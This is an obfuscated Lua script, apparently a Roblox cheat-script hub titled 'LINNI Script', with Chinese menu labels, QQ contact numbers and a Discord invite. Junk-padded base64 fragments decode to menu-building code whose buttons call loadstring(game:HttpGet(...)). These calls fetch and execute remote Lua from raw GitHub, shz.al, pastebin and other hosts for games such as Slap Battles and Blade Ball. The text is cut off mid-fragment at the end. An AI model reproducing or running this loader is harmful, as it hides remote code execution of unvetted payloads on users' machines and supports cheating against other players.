rvNQ('cfpxzAnfXkMAJHmrzHQvdJOhFAODAMNIAZQeOloUpgCMCTmNFOPPfZRHcGmWaKPXVyeXmZLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')剑客脚本（通用）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gTVolvtfqFqoxicuDoGEwQLGRCPaoGcGxyQSUASnjFkeRCYWFMTWlhnkUUnTBRsGvqmtEkLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UXJgPcQvfMSwNwFOXVJbMUNIZWyZABAILXFKmxUcYDqcTSboqtLPFhZhtsMoGfgiddmKzCamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UVTztnPUXcCRVeIQiZacEduWbGruHtrDfXewtnULOwEDQODUakvPhLAknPmAjQwWjOkzimamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MvGSViYPaEIfGobbFnHmkpUJhifyNRElcTWpbIvvCdYbIfoAiTMqglCgckZFeEpIgPIqyubG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WZCwgDuyYZwGSSsxdArDXzfOtECdCdsZgwRMmqApnMWoDbMDYZdbkVMhLigHpssGRUvnrXKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')巴掌模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VTolzgMLwrwgaQLgfNorsLPiPkwFWhIfsNpHBRPfXajOXjcJzxPVzysMBMBfRAIdBpuxNqLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BGmQWZQtTsCArFWILKfgJSfWEphMTbkVupFKxyKFiACMJUSjkFfjUYQFMYUErBMxigkCrRKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('twStSdxqKshhehRghNqklJRiVkVrgqKbRGuTGZPnsBjJmmSmNMRCrKWAhdmcfhhzKNWYeJLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')自动刷巴掌tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UjgocmLQzsBaaxjWGlHjHQZYQQFphyHUeMNBzcrbjyWOhQQWBurKulpNZJZJmsnhCqhekzLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20FarmtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GbNsxjNGcnLxNgKdynnQVfWxebetWSwnpRGZDqCdsZVJJVuUsIolsPZHOakhXRQGtGwHByKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')巴掌模拟器yydstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IKhTFIVhIQagZiEPnwFaYSHzmsdBsSTVnILZyhUrDHvSekbZYRkgYuzaWgcmJWUxZnGtopLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHAKKSSKSOOStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BCGNSibYqLRWyhXqEzAzfobHelGjNzjnfXJsntkjsigVnzFOuUYMeVuophUEGsHrIdQrNKKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')巴掌模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DwGBpgkgGSCCzxCaVrOzgztOTXrtpDVlpWYDDJzyDlSpswlWxunXIZJoQmsOKnOukeOUCPLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cKUQikGUzvLyXavzmVPbwITUWPbQvTBqkeLcCYmNwdAHuIYdnJNDEnECZZkWQxZkrugrFcKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')常用功能tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LMVSgCOBfKWpkfGbIupUWvJWdmdJfeoNgHhhQnnqfjOFcLXpzRvnUeLcuAdpkZZJxoJnGRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://lkhub.net/s/loader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hMCRQXPaCRDUCNeRBdSOXvobLcJmaSTJYnFxStorjoQstGEbCMexKfXykQFKFftdoXROzKKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')多功能（老外）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rCZzctwuTtdtZuJiTbAdmzqRTqzDqYpuERfLSImvBsfEsJNelZhtsECpXZpkFbIwPlmpGTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20BattlestZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('suZsneEGhjzHnUfZtDErlBrDVCbGgyDyRzgVZdiACjbzLsMziSbKSdqLDqmLTVTZonbUmaKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')内脏与黑火药脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iUTITnJidtGQhXRtFSdhsESTdqTGbzsWbnAndrTBMVQoOrxmvqfdWsZYCTcJJrzmCGXYqdLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xiaWBnvibKjXSIQypZtplrCwEgzlSmxXoUygniLtKIzuNHGZUONIhwQhOTaCvYDsNmEuIPKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZRUCFZNZqQMVdmjSpkXFGKpWaYamUgVJzivucNHTPcMMrOsQHriCNrLcXBtTjkifbQMalpLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')加入https://discord.gg/RjqwhMY7DU获取密钥tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NpQPzHLUbBDpIJzfBYuRUkhbnAXbodbZLDQITbEkpzrhAFtwxBebHwroTkcfAiEsbtIVKmLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/FnfCheatbotsonroblox/kitten.cc-lua/main/kitten-obfuscated%20(1).luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XeZZENKFYAUhAapItCslDPKAGtlCYjWWWvtplqpzrJygrOyuzwUKTunjjsOfeVsjRytqVrKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')点击我复制dctZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eoaHHxuTtmcLPLlRAvTbcNMrAIAbNUAcyCQkFzKjiUSLZccGsuywyXJosksESzBkYYYtywLGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://discord.gg/RjqwhMY7DUtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KhDsVholettwXFUOXCrjWpgBulGdKgDPwpCfeQLARqWmzjWibHbinNuSRAIaIrBGaVqSadKQ0KZW5kKQ0KbG9jYWwgY3JlZGl0cyA9IGNyZWRzOnNlY3Rpb24o')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lynkRbOnksMZrRPCLfWviNaEoLMbSoFMbCvLzgKxlcGjLbdqFFxjfwWuAQAuKWDQkYToqOLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')内脏与黑火药tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('twoTfJlFbZhnujjhZlOuqwmsITfmmsnPstTlcfCCnDwjJxzXKARPSUCFlrnubkBjgSQCGtLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KSKKStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pMsFusapHjDNFbnnzYKcNmdaICEVJeCemtkAldxBgiuivBqVLqicaiLYmvPgPBPMboQgrKKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')51区脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rSUMlEVIdPGHcicoOlfmPNgEnxsBQqxOYGvlaefcwvQTfNyjcVSCdCvXohnOVlofzXbKomLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BFFyJEmQzxPLkDHEJgGLTpKDKQnlTIIjBNCfjMtwvXPLDalHAMNVTkTrgVEeVFaJgFARqaKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('maLvZxiCcIwZUuuRxQkCNVuyVUoMAbOaInAJZQwNpgOgJGVdfmxouWzUcbXvWIesuQuzOALHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')51区tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HPCjBoInqqdSPHIeiYRSIffSGjrTICYuSGANgKQETAuTHXLHOoNuvgkkvsMqtnnseWCirVLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vGvgOPTPejTYiyobxtjFEeIjsNvfwQfZKPHZIGuuEChRuIWhWxNwvdkexWtgCapdggNCwzLCB0cnVlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')短信模拟器脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hWqlqjouYbjWleHSRFddkyTeBNYntfrVreGdBclbccmfokmabkPPyggQwKJwrxcTvABxrDLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZCyYOmdGkTmkzPLToDkPjUfhYHtrUnsSgbidcqYQWhSKHRvyquZhuPkgNYOUhmypaUkEZUKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tBRzUKeiWFqPnocRUJOEVqMlgjBWiLxiXZAISmAzsUPcBpeKjXJCfymPjkluESIvphDSniLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')短信模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NBUivkLeSqNOfvFWPhIltuecFLMYVIzIgkXxpUBXDPnyfTWiUHpFCWSJDTQwQfXMvjUTmmLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://pastebin.com/raw/9hxkxUZ5tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VrMkGmFoXSZWuSoVawRwlbjckBLtaSdalmXNTrSmJJJfvVeqRtuLgJHGoxDYwWoEUpNcipKSx0cnVlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')克隆大亨脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IOItqDDSTPeTShqzPfpQgUYFvGkLNfWFWbjoiMVFUZCAgVbwsfFzjXjFxSwDDntBdObluXLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HJhLttCFFRNpkiNkMLCMfeowFloUvEgDAmnHxsGaMsktGiZurtFSiQshqrtoAFQPlWcVcIKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gEAjahCVGlpPmzPHbOVOsqHRhXfdBqxbHaWPfNqZeQzmycRATismGYlNToDzuHDZnbYOwOLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')克隆大亨tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TordKthNExPbRvXxpLQJyuUhILeokkrnADXWUajyXxMmoxbxZPSOzkubdVjIqqmjppTsDfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/HELLLO1073/RobloxStuff/main/CT-DestroyertZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SdlcsuoPFIOUUhAmAcdTfotlVhZYxmvFWIWzxtzxHJhYuXsulgKoJTEDsYmTVgCPHndtkdKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')刀刃球tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xbymgiAWmspBumvupoeBRCeTmEOHVVLELVSLBBlHYzYufvkbzIzoiAAmVfVjzowRBPHUQTLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ggnCszsnpTLalDhdwyXkumGkuMSWRPSBuKBlfevmFRBMSCfVEGLZVrijftcoRdrGsamQPXKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』（听说的战场）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YIpayZhjvswGtPYlpjaumQrIgaryQFUfggZKepWViyRqUArjSUnYYnmpNhoScXDlpTweUtLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺汉化刀刃球tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('oSQRLMZQsquXURBUmcWDPeVucwlAFrduynEErOXBjFxBnrgBZToRYVivDKVGrrshclMdcALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/75G8tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VAFlARJXMKDFVvOfGrgoFTWqMdyrMsAzokauvEnqnQIbwmWEAzoJQDecrZRCjkbudRmlORKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Seeds-Next刀刃球不会的自己研究『强，作者推荐』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hEUdkZMzpNQqHUulKMmZuQEARaydKHSSzVdUJQFQlrxCySOEFyWElnDmOEAktkkziFOuvOLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://shz.al/~Seeds-Next/Ditto-so-tried/HAGOU-and-QumuuuuutZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DKRXrOpdYAUHlfitxSyWfxCcqAoPvJAljQUSszaFQZSSpsqSCugpaQMTCKJsBbSCzMkszvKSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')刀刃球（强1）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PACNpMdXOMpFPalSevBqnvpWCqRGNWeQEOeUiPmQLtvvEsOPBfyCiAzFgUkKSIAmWFQIrGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/Unknownkellymc1/Unknownscripts/main/slap-battlestZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yZNAIySRNbReJKsMwlvbEeRBwvQemUDlWOdQNZfTwMOxACDmbqPiFuOBrJmOXeitvjmpKMKSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')刀刃球（强2）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qkqZeOmWJnLNaVkcyLNamUQVJPaJuJJgzDICLcnqSgTHAZRnvIxqbqJnAGqsRaGDbXjlOALGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/HKLua/Balls/main/DawnLoader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aQTVUFxiuZKwfknfFeWXvBhjyRKzwRteiSEefglMepdktjPWIYgbiCKTAHVWVqstKXEEmfKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')刀刃球（强3）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lPVmLsZWoblxFaJTixyjcEiOtuhwUVMAbEHQiWAMdQQjNrWXDxFPseENwhRfTrvwjwyaGyLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/REDzHUB/BladeBall/main/redz9999tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('phaoJXBOUQNBWHZbWAxozliXRvMfyMeqEyHbpNUXGtQgAciejeJCuxLtjwXgGbnrUpEGSQKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')刀刃球（强4）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bRUBfXUBVgOufgrRHplhvuxMlCoXSQKYrmtLPDckUwEfthDwfHgmdRkmZoqpASqJDqEMyjLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Neoncat765/Neon.C-Hub-X/main/UnknownVersiontZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TObzFkinzJMxzzNvrLsbwGwxCgtKmcyZMcfVyCNQXuJdRLukPyTMjuaPIjwoVkucqgvQsHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')刀刃球（强5）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VazIDBXofbrZStiPLAPZCkIxkkmIpjRsWoNGhyKaKoadGvtAibcpnbFueIBNzmfjsFNMmtLGZ1bmN0aW9uKCkNCiAgICBsb2NhbCBhLGIsYyxkPWxvYWRzdHJpbmcscmVxdWVzdCBvciBodHRwX3JlcXVlc3Qgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgKHN5biBhbmQgc3luLnJlcXVlc3QpLGFzc2VydCw=')https://shz.al/~NeoV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mcuYyCMCgFYQaWLOeytFcmIptNnZlUwepNJIuuODtimWnzisSFxRKIVzdQzTSkXPDGqWNpYyhhIGFuZCBiLCA=')Your Executor does not support.tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yAErPolpSUrQFaBpAJzAFxLOzudhbKQjaywnlZvFLHxzFdZTTSPrbcATSaRZPMHhODVgasKWEoYih7VXJsPWQsTWV0aG9kPQ==')GETtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fjZnjaIPemlHxiKKMRWdhNwlebBAwluaZmQOAqpWluzRSajdLXvoqsHElvYRXyizCjTOglfSkuQm9keSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')刀刃球（强6）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ohmuKjMCWBTQBvzEpJgJCMgtxygsPgrqwjwCOLtpyTdnocOVwLhhNTwgsHuoAvgldtzvQRLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/HKLua/Balls/main/DawnLoader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FvEVJiCevBAFJmYTFbNQthxxfPNHzPStYeFsXPNXYXnyCcNGdAuGXxhqepLtPOSGRWHwXzKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AmmIHkhCUMETrpAbwIVOyaajoMRzgTaamcqaQDeLtfLDZiqQIeQYcXNjyzudeRmrEMbsEqLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sUHfTwoYkEaEwwKsVQQYNtZvSnliHthPyJYwZWlIkjHVCZkxehlTRqbGiMVSuKhIxbguTNamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XaHmLpUftqzNwbViVdJWkPyMDEHjskIAJoZjorSlePHmwXHCPBYQLOjtjydykBrwVtvLtRamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QHmqnrBLlKhgCzgnMwsYGYrsxQNQRNpMazUXtpdRCIdHbWLtSCZcDrftbZDRDwLYhfkMFPbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OszdogWjTQgACcOGrYfkfrwYaWLGAhnZoNMBZrYnaDBOpICvHvYGZgBIZmtSFVPmRbsFchKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')模仿者tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KLgKIKisxSYVJtXpoFGENtMaDewMxNuPQaAjPmExEXcGVekWxgAiYQjBoirnYGyqwnxIsILA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vyePQstsjEGDnvUuXlGsDHVtdOdYWkWailExQgXGlyCGRltqibzZNjaAuRuiLHpgYCSwdBKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZfgPnXTIctmngsOpzCxpQgHCyEXtKHAmJirsbplyDqHbtehNuyQwZBGGTvrClTXFUrzofpLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')模仿者（1有自动赢）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TQYrZHvDtrQqdpkTcJNQknhgkdiGuVgJsvNjNNIsoMvMwhmhltJqrmNuRqKdbGiovjxAArLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.mdtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rDyQKNDZAeaLBQh